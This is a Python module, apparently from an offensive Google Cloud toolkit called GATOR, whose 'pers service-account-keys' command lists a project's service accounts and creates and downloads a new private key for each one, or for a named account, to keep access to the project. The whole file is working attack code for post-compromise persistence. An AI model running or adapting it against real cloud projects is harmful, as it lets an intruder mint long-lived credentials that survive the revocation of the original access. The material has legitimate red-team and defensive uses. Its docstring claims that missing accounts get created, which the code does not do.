"""
Author:         Anirban Das
                github.com/anrbn
                linkedin.com/in/anrbnds

Command:        pers service-account-keys
Description:    Creates and downloads Service Account Key for Persistence.
Explained:      Creates and downloads the key of every Service Account or a specific Service Account that exists in a project for Persistence. If the Service Account given doesn't exist, it will be created along with the key which is then downloaded.  
"""

import os
import base64
import json
import colorama, platform

import google.auth
from google.oauth2 import service_account
import google.oauth2.credentials

from googleapiclient.discovery import build


if os.path.exists("/.dockerenv"):
    output_dir = "/tmp/GATOR/download/Persistence/Cloud IAM/service-account-keys"
#elif platform.system() == "Windows":
    #output_dir = "./download/Persistence/Cloud IAM/service-account-keys"
else:
    output_dir = "./download/Persistence/Cloud IAM/service-account-keys"

os.makedirs(output_dir, exist_ok=True)


if platform.system() == "Windows":
    colorama.init()

RESET = colorama.Style.RESET_ALL
BOLD = colorama.Style.BRIGHT
RED = colorama.Fore.RED
GREEN = colorama.Fore.GREEN
YELLOW = colorama.Fore.YELLOW
MAGENTA = colorama.Fore.MAGENTA


def run_module(project_id, serviceaccountpath, active_access_token, sadownload=None):
    output = ""
    try:
        if serviceaccountpath is not None:
            creds = service_account.Credentials.from_service_account_file(serviceaccountpath)
        elif active_access_token is not None:
            creds = google.oauth2.credentials.Credentials(active_access_token)
        else:
            output += f"{RED}- No valid authentication method provided.{RESET}\n"
            return output
        
        service = build('iam', 'v1', credentials=creds)

        response = service.projects().serviceAccounts().list(name=f'projects/{project_id}').execute()
        all_accounts = [account['email'] for account in response['accounts']]

        if sadownload == 'default' or sadownload is None:
            accounts_to_download = all_accounts
        else:
            if sadownload in all_accounts:
                accounts_to_download = [sadownload]
            else:
                output += (f"{RED}- Service Account {sadownload} doesn't exist.{RESET}\n")
                return output

        for account_email in accounts_to_download:
            key = service.projects().serviceAccounts().keys().create(
                name=f'projects/{project_id}/serviceAccounts/{account_email}',
                body={'keyAlgorithm': 'KEY_ALG_RSA_2048'}
            ).execute()

            key_data = key['privateKeyData']
            decoded_key_data = base64.b64decode(key_data)
            json_key_data = json.loads(decoded_key_data)

            with open(f'{output_dir}/{account_email}-key.json', 'w') as key_file:
                json.dump(json_key_data, key_file, indent=2)

            output += (f"{GREEN}+ Successfully downloaded key for Service Account: {account_email}{RESET}\n")
            output += (f"  Directory: {output_dir}\n")
    except Exception as e:
        output += f"{RED}  An error occurred: {str(e)}{RESET}"
        return output

    return output
